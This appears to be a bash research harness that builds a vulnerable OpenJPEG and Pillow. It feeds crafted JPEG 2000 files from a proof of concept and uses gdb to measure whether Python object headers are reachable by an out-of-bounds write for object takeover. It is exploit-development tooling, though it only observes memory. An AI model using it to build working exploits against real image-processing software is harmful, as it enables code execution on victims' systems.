#!/usr/bin/env bash
# Measure gap-aligned live Python objects in the 24-byte-strided OOB region.
# The stores land at base+24k+8 and base+24k+16 and leave base+24k..+24k+7
# untouched, so an object with ob_refcnt at base+24k would keep a small refcnt
# while ob_type at base+24k+8 takes the store. This harness measures where such
# objects actually sit relative to the reachable TPsot range. Local process
# only; gdb observes, never writes memory. The outcome is layout-dependent:
# this script reports reachability, it does not assert a structural result.
#
# Usage: bash gap-reach.sh OUTDIR
set -u

HERE=$(cd "$(dirname "$0")" && pwd)
OUT=$(mkdir -p "$1" && cd "$1" && pwd)

VLSRC="$OUT/src/openjpeg-2.5.4"
mkdir -p "$OUT/src"
tar -xzf "$HERE/src/openjpeg-2.5.4.tar.gz" -C "$OUT/src"
cmake -S "$VLSRC" -B "$OUT/dbg-build" -DBUILD_SHARED_LIBS=ON -DBUILD_CODEC=OFF \
  -DBUILD_TESTING=OFF -DCMAKE_BUILD_TYPE=Debug \
  -DCMAKE_C_FLAGS="-g -O0 -fno-omit-frame-pointer" \
  -DCMAKE_INSTALL_PREFIX="$OUT/dbg-install" > "$OUT/cmake.log" 2>&1
cmake --build "$OUT/dbg-build" -j4 > "$OUT/build.log" 2>&1
cmake --install "$OUT/dbg-build" > "$OUT/install.log" 2>&1
[ -f "$OUT/dbg-install/lib/libopenjp2.so.7" ] || { echo "FAIL debug lib build"; exit 1; }

PILROOT="$OUT/pc/pw-vuln"
if [ ! -d "$PILROOT/PIL" ]; then
  bash "$HERE/pillow-consumer.sh" "$OUT/pc" > /dev/null 2>&1
  [ -d "$PILROOT/PIL" ] || { echo "FAIL pillow build"; exit 1; }
fi

n=0
pass() { n=$((n+1)); echo "PASS $n $1"; }
fail() { echo "FAIL $1"; exit 1; }

: > "$OUT/trace.txt"
TOTAL_OBJ=0
TOTAL_GAP=0
# label evil target
while read -r label evil target; do
  [ -n "$label" ] || continue
  python3 "$HERE/make-large-tpsot.py" "$HERE/src/poc.j2k" "$OUT/$label.j2k" \
    "$target" "$evil" > "$OUT/$label.gen.log" 2>&1
  LD_LIBRARY_PATH="$OUT/dbg-install/lib" PILROOT="$PILROOT" \
    gdb -q -batch -x "$HERE/gap-scan.gdb" --args \
    python3 "$HERE/pillow-probe.py" "$OUT/$label.j2k" > "$OUT/$label.gdb.log" 2>&1
  grep '^OBJ ' "$OUT/$label.gdb.log" >> "$OUT/trace.txt" || true
  BASE=$(sed -n 's/^BASE=\(0x[0-9a-f]*\)$/\1/p' "$OUT/$label.gdb.log")
  [ -n "$BASE" ] || fail "$label: no sink observation"

  OBJ_COUNT=$(grep -c '^OBJ ' "$OUT/$label.gdb.log" || true)
  GAP_COUNT=$(grep '^OBJ ' "$OUT/$label.gdb.log" | grep -c 'mod24=0 ' || true)
  TOTAL_OBJ=$((TOTAL_OBJ+OBJ_COUNT))
  TOTAL_GAP=$((TOTAL_GAP+GAP_COUNT))
  MIN_IDX=$(grep '^OBJ ' "$OUT/$label.gdb.log" | grep 'mod24=0 ' \
    | sed -n 's/.*off=\([0-9]*\) .*/\1/p' | sort -n | head -1)
  if [ -n "$MIN_IDX" ]; then
    MIN_IDX=$((MIN_IDX / 24))
    if [ "$MIN_IDX" -le "$evil" ]; then R=REACHABLE; else R=OUT_OF_RANGE; fi
  else
    MIN_IDX=none; R=NO_GAP_OBJECT
  fi
  echo "MEASURE $label base=$BASE objects=$OBJ_COUNT gap_objects=$GAP_COUNT min_gap_index=$MIN_IDX evil=$evil reachability=$R"
done <<EOF
takeover 48 10731952
mid 154 10731296
large 184 10731296
EOF

[ "$TOTAL_OBJ" -gt 0 ] || fail "scanner found no live object headers"
pass "scanner found live object headers (count=$TOTAL_OBJ)"
[ "$TOTAL_GAP" -gt 0 ] || fail "scanner found no gap-aligned objects"
pass "scanner found gap-aligned objects (count=$TOTAL_GAP)"

echo "RESULT $n PASS / 0 FAIL"
sha256sum "$OUT/trace.txt"
